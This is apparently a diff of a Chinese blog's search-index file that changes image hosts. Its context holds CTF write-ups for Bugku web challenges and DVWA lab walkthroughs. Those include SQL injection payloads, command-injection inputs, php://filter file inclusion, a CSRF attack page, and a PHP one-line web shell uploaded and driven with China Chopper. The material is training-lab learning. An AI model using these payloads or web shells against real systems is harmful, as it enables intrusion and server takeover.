@@ -95,7 +95,7 @@
     <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h5><p>最近把bugku的基础web题都刷完了。里面有大概10道题都不能访问。这里记录一下解题的过程。<a id="more"></a></p>
 <h5 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a><strong>备份是个好习惯</strong></h5><p>题目提示：听说备份是个好习惯。</p>
 <p>于是试着加入后缀<strong>index.php.bak</strong>，然后看到提示下载。然后打开下载的备份文件看到：</p>
-<img src="http://img.kawhi.xyz/image-20200322105903654.png" alt="image-20200322105903654" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200322105903654.png" alt="image-20200322105903654" style="high:80%;width:80%;" />
 
 <p>就是要传入的两个值的md5相等，但是两个值不相等。</p>
 <p><strong>解决方式一：</strong>md5函数无法处理数组，如果传入数组会返回NULL。构造url:</p>
@@ -105,7 +105,7 @@
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://123.206.87.240:8002/web16/?kkeyey1=QNKCDZO&amp;kkeyey2=240610708</span><br></pre></td></tr></table></figure>
 
 <h5 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a><strong>变量1</strong></h5><p>打开网页看到</p>
-<img src="http://img.kawhi.xyz/image-20200322104141287.png" alt="image-20200322104141287" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200322104141287.png" alt="image-20200322104141287" style="high:80%;width:80%;" />
 
 <p>题目已经通过正则表达式对$args进行了过滤，但是这里可以使用超全局变量$GLOBALS。</p>
 <p>因为PHP在$GLOBALS[index]数组中储存了所有全局变量，变量的名字就是数组的键。</p>
@@ -113,7 +113,7 @@
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://123.206.87.240:8004/index1.php?args=GLOBALS</span><br></pre></td></tr></table></figure>
 
 <h5 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a><strong>flag在index里</strong></h5><p>打开页面如下：</p>
-<img src="http://img.kawhi.xyz/image-20200320140041305.png" alt="image-20200320140041305" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200320140041305.png" alt="image-20200320140041305" style="high:80%;width:80%;" />
 
 <p>看到file知道应该是文件包含漏洞，但不知道如何下手，看wp之后知道可以用PHP内置协议php://filter</p>
 <p>构造url:</p>
@@ -121,7 +121,7 @@
 
 <p>可以看到通过base64加密后的源码已经爆出,解密,得到flag。</p>
 <h5 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a><strong>成绩单</strong></h5><p>打开网页如下：</p>
-<img src="http://img.kawhi.xyz/image-20200322144603485.png" alt="image-20200322144603485" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200322144603485.png" alt="image-20200322144603485" style="high:80%;width:80%;" />
 
 <p>一开始我就觉得是sql注入，但是还是没有做出来，然后看了wp觉得好简单。</p>
 <p>查数据库</p>
@@ -138,36 +138,36 @@
 
 <p>得到flag</p>
 <h5 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a><strong>秋名山老司机</strong></h5><p>打开网页看到如下：</p>
-<img src="http://img.kawhi.xyz/image-20200322165647628.png" alt="image-20200322165647628" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200322165647628.png" alt="image-20200322165647628" style="high:80%;width:80%;" />
 
 <p>本题要求计算响应内容中的表达式并用 POST 请求返回结果，但是必须在两秒之内完成。所以靠手工的方法是做不到的。这里可以利用python里面的request写一个脚本。详情可参考：<a style="text-decoration:none;" class="foo" target="_blank" href="https://ciphersaw.me/2017/12/16/详解 CTF Web 中的快速反弹 POST 请求/">传送门</a></p>
 <p>脚本如下：</p>
-<img src="http://img.kawhi.xyz/image-20200322201254499.png" alt="image-20200322201254499" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200322201254499.png" alt="image-20200322201254499" style="high:80%;width:80%;" />
 
 <p>这里的会话对象 Session() 能够在多次请求中保持参数，然后是引入 re 模块，其次用 search() 正则匹配算术表达式，匹配成功后用 group() 返回算术表达式的字符串。获得算术表达式的字符串后，直接利用 Python 的內建方法 <a href="https://docs.python.org/3/library/functions.html#eval">eval()</a> 来计算出结果。然后运行脚本就可得到flag。</p>
 <h5 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a><strong>速度要快</strong></h5><p>打开网页如下：</p>
-<img src="http://img.kawhi.xyz/image-20200322212200486.png" alt="image-20200322212200486" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200322212200486.png" alt="image-20200322212200486" style="high:80%;width:80%;" />
 
 <p>然后查看响应头和网页的源代码发现：</p>
-<img src="http://img.kawhi.xyz/image-20200322212837581.png" alt="image-20200322212837581" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200322212837581.png" alt="image-20200322212837581" style="high:80%;width:80%;" />
 
 <p>应该是要提交以margin为key，flag里的值为value然后以post的方式提交数据。但是有一个问题就是手动提交没成功，查看wp发现和秋名山老司机那一题是差不多的。他的flag是不断在变的。所以需要写一个脚本来得到flag。</p>
-<img src="http://img.kawhi.xyz/image-20200322213958769.png" alt="image-20200322213958769" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200322213958769.png" alt="image-20200322213958769" style="high:80%;width:80%;" />
 
 <h5 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a><strong>cookie欺骗</strong></h5><p>打开网页发现：</p>
-<img src="http://img.kawhi.xyz/image-20200323114059871.png" alt="image-20200323114059871" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200323114059871.png" alt="image-20200323114059871" style="high:80%;width:80%;" />
 
 <p>这里把filename后面的字符串base64解码后发现是keys.txt。然后试着把index.php传上去，这里需要base64编码后再上传。然后line的值输入数字之后发现出现一行一行的代码，这里可以写个脚本把所有的代码显示出来。</p>
-<img src="http://img.kawhi.xyz/image-20200323115824785.png" alt="image-20200323115824785" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200323115824785.png" alt="image-20200323115824785" style="high:80%;width:80%;" />
 
 <p>分析源码，前面判断传参，后面判断cookie必须满足margin=margin才能访问keys.php。</p>
-<img src="http://img.kawhi.xyz/image-20200323120059198.png" alt="image-20200323120059198" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200323120059198.png" alt="image-20200323120059198" style="high:80%;width:80%;" />
 
 <h5 id="Never-give-up"><a href="#Never-give-up" class="headerlink" title="Never give up"></a><strong>Never give up</strong></h5><p>打开网页如下所示：</p>
-<img src="http://img.kawhi.xyz/image-20200323212638319.png" alt="image-20200323212638319" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200323212638319.png" alt="image-20200323212638319" style="high:80%;width:80%;" />
 
 <p>发现源代码里面有一个1p.html，但是直接访问这个的话是会跳转到官网里面。所以使用burp suite抓包，然后经过一系列的编码后发现一段php的代码。</p>
-<img src="http://img.kawhi.xyz/image-20200324095112996.png" alt="image-20200324095112996" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200324095112996.png" alt="image-20200324095112996" style="high:80%;width:80%;" />
 
 <p>这里其实直接打开<a href="http://123.206.87.240:8006/test/f4l2a3g.txt%E5%8D%B3%E5%8F%AF%E8%8E%B7%E5%BE%97flag%E4%BA%86%E3%80%82%E4%BD%86%E6%98%AF%E7%9C%8Bwp%E4%B9%8B%E5%90%8E%E6%9C%89%E4%BA%BA%E8%AF%B4%E5%8F%AF%E8%83%BD%E6%98%AF%E5%87%BA%E9%A2%98%E4%BA%BA%E7%9A%84%E5%A4%B1%E8%AF%AF%E3%80%82%E6%89%80%E4%BB%A5%E8%BF%98%E6%9C%89%E5%8F%A6%E5%A4%96%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95%E3%80%82">http://123.206.87.240:8006/test/f4l2a3g.txt即可获得flag了。但是看wp之后有人说可能是出题人的失误。所以还有另外一种解法。</a></p>
 <p>第1行：限制 URL 查询字符串中必须有非空非零变量<font color=#DC143C>id</font></p>
@@ -192,9 +192,9 @@
 </ul>
 <p>构造payload后爆出flag</p>
 <p>这里要注意的是在构造变量 <code>b</code> 中的空字符时，过早将空字符 <code>\x00</code> 放入，在提交请求时导致请求头截断，继而请求失败，得不到响应。因为 <code>b</code> 是 URL 查询字符串中的变量，不应该在此放入空字符 <code>\x00</code>，而应该为空字符的 URL 编码 <code>%00</code>。</p>
-<img src="http://img.kawhi.xyz/image-20200324155132388.png" alt="image-20200324155132388" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200324155132388.png" alt="image-20200324155132388" style="high:80%;width:80%;" />
 
-<h5 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a><strong>字符？正则？</strong></h5><img src="http://img.kawhi.xyz/image-20200325174427232.png" alt="image-20200325174427232" style="high:80%;width:80%;" />
+<h5 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a><strong>字符？正则？</strong></h5><img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200325174427232.png" alt="image-20200325174427232" style="high:80%;width:80%;" />
 
 <p>题目如上：可以看出只要我们构造出符合正则表达式的字符串通过GET传参就可以看到flag。所以首先要分析这个正则。</p>
 <p><strong>定界符：</strong>/和/ 一般来说是这两个。</p>
@@ -207,21 +207,21 @@
 <p>这里我构造的payload为：key1key11111key:/1/1keya&gt;</p>
 <p>通过get传参即可得到flag。</p>
 <h5 id="web8"><a href="#web8" class="headerlink" title="web8"></a><strong>web8</strong></h5><p>题目如下：</p>
-<img src="http://img.kawhi.xyz/image-20200325183547450.png" alt="image-20200325183547450" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200325183547450.png" alt="image-20200325183547450" style="high:80%;width:80%;" />
 
 <p>首先分析一下这个题目：</p>
 <p>ac变量不为空，fn要用php://input读取，和前面的题目有一些类似</p>
-<img src="http://img.kawhi.xyz/image-20200325183817128.png" alt="image-20200325183817128" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200325183817128.png" alt="image-20200325183817128" style="high:80%;width:80%;" />
 
 <p>这道题是自己做出来的flag，虽然题目简单，还是挺开心的，终于不用看wp了。</p>
 <h5 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a><strong>求getshell</strong></h5><p>题目如下</p>
-<img src="http://img.kawhi.xyz/image-20200325203204296.png" alt="image-20200325203204296" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200325203204296.png" alt="image-20200325203204296" style="high:80%;width:80%;" />
 
 <p>用burpsuite抓包后改这三个地方即可得到flag</p>
-<img src="http://img.kawhi.xyz/image-20200325203355071.png" alt="image-20200325203355071" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200325203355071.png" alt="image-20200325203355071" style="high:80%;width:80%;" />
 
 <p>没想到是这样就得出flag，一开始我只改了下面两个箭头，还拿菜刀在那里连个半天。</p>
-<h5 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a><strong>INSERT INTO注入</strong></h5><img src="http://img.kawhi.xyz/image-20200326201031090.png" alt="image-20200326201031090" style="high:80%;width:80%;" />
+<h5 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a><strong>INSERT INTO注入</strong></h5><img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200326201031090.png" alt="image-20200326201031090" style="high:80%;width:80%;" />
 
 <p>题目直接给出了源代码，并且告知要写python脚本。</p>
 <p>这里用explode函数将字符串转换成数组，并且是根据逗号分割的。所以这里</p>
@@ -269,11 +269,11 @@
 <p>这里可以使用updatexml报错注入。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">123.206</span><span class="number">.87</span><span class="number">.240</span>:<span class="number">9004</span>/Once_More.php</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><br><span class="line"><span class="comment">#web1002-2</span></span><br><span class="line"></span><br><span class="line">http://<span class="number">123.206</span><span class="number">.87</span><span class="number">.240</span>:<span class="number">9004</span>/Once_More.php</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;web1002-2&#x27;  limit 1),0x7e),1)--+</span><br><span class="line"><span class="comment">#class,flag2</span></span><br><span class="line"></span><br><span class="line">http://<span class="number">123.206</span><span class="number">.87</span><span class="number">.240</span>:<span class="number">9004</span>/Once_More.php</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag2&#x27; ),0x7e),1)--+</span><br><span class="line"><span class="comment">#flag2,address</span></span><br><span class="line"></span><br><span class="line">http://<span class="number">123.206</span><span class="number">.87</span><span class="number">.240</span>:<span class="number">9004</span>/Once_More.php</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select flag2 from flag2),0x7e),1)--+</span><br><span class="line"><span class="comment">#flag&#123;Bugku-sql_6s-2i-4t-bug&#125;</span></span><br></pre></td></tr></table></figure>
 
-<h5 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a><strong>flag.php</strong></h5><img src="http://img.kawhi.xyz/image-20200331150635411.png" alt="image-20200331150635411" style="high:80%;width:80%;" />
+<h5 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a><strong>flag.php</strong></h5><img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200331150635411.png" alt="image-20200331150635411" style="high:80%;width:80%;" />
 
 <p>打开发现如上：</p>
 <p>底下还有一段：</p>
-<img src="http://img.kawhi.xyz/image-20200331150809369.png" alt="image-20200331150809369" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200331150809369.png" alt="image-20200331150809369" style="high:80%;width:80%;" />
 
 <p>应该迷惑的，KEY的值是0。上面并没有定义。</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">print_r(serialize(<span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//s:0:&quot;&quot;</span></span><br></pre></td></tr></table></figure>
@@ -370,20 +370,20 @@
     <url>/2020/03/14/DVWA%E7%BB%83%E4%B9%A0%E2%85%A0/</url>
     <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h5><p>DVWA是一款开源的渗透测试漏洞练习平台,分别有不同的练习板块，如暴力破解，CSRF，文件包含和上传漏洞，以及SQL注入漏洞，XSS等等。还分别有低中高难度可以选择。<a id="more"></a></p>
 <h5 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a><strong>暴力破解</strong></h5><h6 id="low等级"><a href="#low等级" class="headerlink" title="low等级"></a>low等级</h6><p>界面如下，是一个输入用户名和密码的文本框</p>
-<img src="http://img.kawhi.xyz/image-20200314104652827.png" alt="image-20200314104652827" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200314104652827.png" alt="image-20200314104652827" style="high:80%;width:80%;" />
 
 <p>这里直接用burp suite去破解他的密码，结果如下：</p>
-<img src="http://img.kawhi.xyz/image-20200314104812871.png" alt="image-20200314104652871" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200314104812871.png" alt="image-20200314104652871" style="high:80%;width:80%;" />
 
 <p>这里查看一下源码</p>
-<img src="http://img.kawhi.xyz/image-20200314105302160.png" alt="image-20200314105302160" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200314105302160.png" alt="image-20200314105302160" style="high:80%;width:80%;" />
 
 <p>发现没有任何防止爆破的机制</p>
 <p>而且存在sql注入漏洞，也可以输入admin’#即可成功登录</p>
-<img src="http://img.kawhi.xyz/image-20200314110629085.png" alt="image-20200314110629085" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200314110629085.png" alt="image-20200314110629085" style="high:80%;width:80%;" />
 
 <h6 id="Medium等级"><a href="#Medium等级" class="headerlink" title="Medium等级"></a>Medium等级</h6><p>先查看一下源码</p>
-<img src="http://img.kawhi.xyz/image-20200314110942887.png" alt="image-20200314110942887" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200314110942887.png" alt="image-20200314110942887" style="high:80%;width:80%;" />
 
 <blockquote>
 <p>发现比low等级多了两行，箭头所示</p>
@@ -392,39 +392,39 @@
 <p>但是依然没有加入有效的防爆破，爆破方式和low等级一样</p>
 </blockquote>
 <h6 id="High等级"><a href="#High等级" class="headerlink" title="High等级"></a>High等级</h6><p>通过抓包可以发现登录的时候提交了四个参数</p>
-<img src="http://img.kawhi.xyz/image-20200314111842212.png" alt="image-20200314111842212" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200314111842212.png" alt="image-20200314111842212" style="high:80%;width:80%;" />
 
 <blockquote>
 <p>这样就要求我们发送的每个请求包中包含随机生成的token值。我们无法简单的使用Burpsuite完成</p>
 <p>看网上说可以用python脚本抓取每次返回的user_token，这里我没去试了，实力劝退</p>
 </blockquote>
 <h6 id="Impossible等级"><a href="#Impossible等级" class="headerlink" title="Impossible等级"></a>Impossible等级</h6><p>先查看一下源码</p>
-<img src="http://img.kawhi.xyz/image-20200314112505889.png" alt="image-20200314112505889" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200314112505889.png" alt="image-20200314112505889" style="high:80%;width:80%;" />
 
 <blockquote>
 <p>可以看到Impossible级别的代码加入了可靠的防爆破机制</p>
 <p>一旦错误次数达到3次，就会锁定用户15秒</p>
 </blockquote>
-<h5 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a><strong>命令注入</strong></h5><h6 id="low等级-1"><a href="#low等级-1" class="headerlink" title="low等级"></a>low等级</h6><img src="http://img.kawhi.xyz/image-20200314112821092.png" alt="image-20200314112821092" style="high:80%;width:80%;" />
+<h5 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a><strong>命令注入</strong></h5><h6 id="low等级-1"><a href="#low等级-1" class="headerlink" title="low等级"></a>low等级</h6><img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200314112821092.png" alt="image-20200314112821092" style="high:80%;width:80%;" />
 
 <p>这里我们随便输入一下127.0.0.1&amp;&amp;ipconfig</p>
-<img src="http://img.kawhi.xyz/image-20200314114952634.png" alt="image-20200314114952634" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200314114952634.png" alt="image-20200314114952634" style="high:80%;width:80%;" />
 
 <p>可以发现low等级对ip的参数没有做任何的过滤</p>
 <h6 id="Medium等级-1"><a href="#Medium等级-1" class="headerlink" title="Medium等级"></a>Medium等级</h6><p>先查看一下源码</p>
-<img src="http://img.kawhi.xyz/image-20200314115219862.png" alt="image-20200314115219862" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200314115219862.png" alt="image-20200314115219862" style="high:80%;width:80%;" />
 
 <blockquote>
 <p>发现相比于Low等级的代码，服务器端对ip参数做了一定过滤，把”&amp;&amp;” 、”；”替换为空；本质上是添加了黑名单机制，依旧存在安全问题。</p>
 <p>这里可以使用&amp;或者|，或者用绕过的方式如&amp;;&amp;</p>
 </blockquote>
 <h6 id="High等级-1"><a href="#High等级-1" class="headerlink" title="High等级"></a>High等级</h6><p>查看一下源代码</p>
-<img src="http://img.kawhi.xyz/image-20200314120028803.png" alt="image-20200314120028803" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200314120028803.png" alt="image-20200314120028803" style="high:80%;width:80%;" />
 
 <blockquote>
 <p>发现过滤了如上的字符，但是箭头所示的地方是将“| ”替换为空，并不是“|”，所以这里可以直接输入127.0.0.1|ipconfig即可</p>
 </blockquote>
-<h6 id="Impossible等级-1"><a href="#Impossible等级-1" class="headerlink" title="Impossible等级"></a>Impossible等级</h6><img src="http://img.kawhi.xyz/image-20200314120450931.png" alt="image-20200314120450931" style="high:80%;width:80%;" />
+<h6 id="Impossible等级-1"><a href="#Impossible等级-1" class="headerlink" title="Impossible等级"></a>Impossible等级</h6><img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200314120450931.png" alt="image-20200314120450931" style="high:80%;width:80%;" />
 
 <blockquote>
 <p>可以看到这里不仅加入了token,而且同时对参数ip进行了限制，只有数字才可执行，彻底杜绝了命令注入漏洞。</p>
@@ -435,7 +435,7 @@
 <p>①用户首先登录服务器<br>②服务器返回cookie<br>③然后攻击者将修改用户密码的URL发给用户<br>④用户如果点击了该URL，则密码就会被更改<br>⑤最后，攻击者使用用户的用户名和密码尝试进行登录服务器。如果成功，则证明用户点过url，如果没有登录成功，则用户没有点击url。</p>
 </blockquote>
 <h6 id="low等级-2"><a href="#low等级-2" class="headerlink" title="low等级"></a>low等级</h6><p>查看他的源码</p>
-<img src="http://img.kawhi.xyz/image-20200314122002750.png" alt="image-20200314122002750" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200314122002750.png" alt="image-20200314122002750" style="high:80%;width:80%;" />
 
 <blockquote>
 <p>发现用了上面暴力破解的函数，即过滤了SQL的特殊字符</p>
@@ -444,40 +444,40 @@
 <p>这里可以使用几种不同的方式进行伪造</p>
 <p><strong>方式一：构造修改密码的链接</strong></p>
 <p>这里抓包试一下，并修改链接后重新发包</p>
-<img src="http://img.kawhi.xyz/image-20200314123419806.png" alt="image-20200314123419806" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200314123419806.png" alt="image-20200314123419806" style="high:80%;width:80%;" />
 
 <blockquote>
 <p>有个问题就是：这个链接一眼就能看出来这个链接是改密码的，而且在点击了这个链接后，页面就会显示密码已修改。显然不太好</p>
 </blockquote>
 <p><strong>方式二：构造攻击页面</strong></p>
-<img src="http://img.kawhi.xyz/image-20200314124625220.png" alt="image-20200314124625220" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200314124625220.png" alt="image-20200314124625220" style="high:80%;width:80%;" />
 
 <blockquote>
 <p>如图所示，在本地写一个1.html，然后诱导受害者去点击，点击之后就直接修改密码为4444，而且是以img的方式，显然这种方法比第一种更加隐蔽。</p>
 </blockquote>
 <p><strong>方式三：结合存储型XSS进行重定向</strong></p>
-<img src="http://img.kawhi.xyz/image-20200314125648840.png" alt="image-20200314125648840" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200314125648840.png" alt="image-20200314125648840" style="high:80%;width:80%;" />
 
 <blockquote>
 <p>因为是存储型xss，所以写入之后每次访问xss都会直接重定向1.html页面</p>
 <p>结果也发现密码成功修改</p>
 </blockquote>
 <h6 id="Medium等级-2"><a href="#Medium等级-2" class="headerlink" title="Medium等级"></a>Medium等级</h6><p>查看一下源码</p>
-<img src="http://img.kawhi.xyz/image-20200314141947325.png" alt="image-20200314141947325" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200314141947325.png" alt="image-20200314141947325" style="high:80%;width:80%;" />
 
 <blockquote>
 <p>Medium级别的代码使用 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，即要求本地登录），希望通过这种机制抵御CSRF攻击。</p>
 </blockquote>
 <p>如果使用上面的方式二或者三就会失效，这里可以把1.html再放进包含本地ip地址的文件夹中即可</p>
-<img src="http://img.kawhi.xyz/image-20200314143922825.png" alt="image-20200314143922825" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200314143922825.png" alt="image-20200314143922825" style="high:80%;width:80%;" />
 
 <h6 id="High等级-2"><a href="#High等级-2" class="headerlink" title="High等级"></a>High等级</h6><p>查看一下源码</p>
-<img src="http://img.kawhi.xyz/image-20200314164900286.png" alt="image-20200314164900286" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200314164900286.png" alt="image-20200314164900286" style="high:80%;width:80%;" />
 
 <blockquote>
 <p>发现加入了Anti-CSRF token机制。这里实力劝退</p>
 </blockquote>
-<h6 id="Impossible等级-2"><a href="#Impossible等级-2" class="headerlink" title="Impossible等级"></a>Impossible等级</h6><img src="http://img.kawhi.xyz/image-20200314165136975.png" alt="image-20200314165136975" style="high:80%;width:80%;" />
+<h6 id="Impossible等级-2"><a href="#Impossible等级-2" class="headerlink" title="Impossible等级"></a>Impossible等级</h6><img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200314165136975.png" alt="image-20200314165136975" style="high:80%;width:80%;" />
 
 <blockquote>
 <p>这里要求输入原始的密码，有效的防止了CSRF</p>
@@ -513,24 +513,24 @@
 </blockquote>
 <h6 id="low等级-3"><a href="#low等级-3" class="headerlink" title="low等级"></a>low等级</h6><p><strong>本地文件包含</strong></p>
 <p>查看源代码</p>
-<img src="http://img.kawhi.xyz/image-20200314171409981.png" alt="image-20200314171409981" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200314171409981.png" alt="image-20200314171409981" style="high:80%;width:80%;" />
 
 <blockquote>
 <p>可以看到，服务器端对page参数没有做任何的过滤跟检查</p>
 <p>接下来给page参数随便输入点东西，报错之后就可以看到服务器的绝对路径</p>
 <p>可以轻易获得phpinfo的信息</p>
 </blockquote>
-<img src="http://img.kawhi.xyz/image-20200314172226523.png" alt="image-20200314172226523" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200314172226523.png" alt="image-20200314172226523" style="high:80%;width:80%;" />
 
 <p><strong>远程文件包含</strong></p>
 <blockquote>
 <p>我在phpstudy的www目录下放了一个phpinfo.txt文件，同样是可以读取的。</p>
 <p>说明这个漏洞可以执行远程文件，而且非php格式文件都可以执行</p>
 </blockquote>
-<img src="http://img.kawhi.xyz/image-20200314172507620.png" alt="image-20200314172507620" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200314172507620.png" alt="image-20200314172507620" style="high:80%;width:80%;" />
 
 <h6 id="Medium等级-3"><a href="#Medium等级-3" class="headerlink" title="Medium等级"></a>Medium等级</h6><p>查看一下源码</p>
-<img src="http://img.kawhi.xyz/image-20200314172841792.png" alt="image-20200314172841792" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200314172841792.png" alt="image-20200314172841792" style="high:80%;width:80%;" />
 
 <blockquote>
 <p>看源码可知：Medium级别使用了str_replace函数将“http://”，“https://”，“../”，“..\”替换为空</p>
@@ -561,32 +561,32 @@
 </ul>
 <p>能上传木马，上传的木马能执行，还要清楚上传后的路径</p>
 <h2 id="low等级"><a href="#low等级" class="headerlink" title="low等级"></a>low等级</h2><p>这里直接上传一句话木马<?php @eval($_Post[cmd]);?></p>
-<img src="http://img.kawhi.xyz/image-20200315103605319.png" alt="image-20200315103605319" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200315103605319.png" alt="image-20200315103605319" style="high:80%;width:80%;" />
 
 <p>可以得知木马文件的路径为</p>
 <p><a href="http://192.168.0.105/DVWA-1.9/hackable/uploads/cmd.php">http://192.168.0.105/DVWA-1.9/hackable/uploads/cmd.php</a></p>
 <p>把木马的路径上传中国菜刀就可以获得服务器目录了</p>
-<img src="http://img.kawhi.xyz/image-20200315121026444.png" alt="image-20200315121026444" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200315121026444.png" alt="image-20200315121026444" style="high:80%;width:80%;" />
 
 <h2 id="Medium等级"><a href="#Medium等级" class="headerlink" title="Medium等级"></a><strong>Medium等级</strong></h2><p>查看一下源码</p>
-<img src="http://img.kawhi.xyz/image-20200315110940498.png" alt="image-20200315110940498" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200315110940498.png" alt="image-20200315110940498" style="high:80%;width:80%;" />
 
 <p>发现限制了文件类型必须是jpeg或者或者png，同时文件大小必须小于100000字节。</p>
 <p><strong>BurpSuite抓包修改content-type</strong></p>
-<img src="http://img.kawhi.xyz/image-20200315163240649.png" alt="image-20200315163240649" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200315163240649.png" alt="image-20200315163240649" style="high:80%;width:80%;" />
 
 <p>可以在大箭头处把png修改为php即可成功上传，菜刀使用和low等级一样</p>
 <p>也可修改小箭头处把类型修改为application/octet-stream</p>
 <p>如果直接上传了a.png，菜刀就要使用文件包含的形式即：</p>
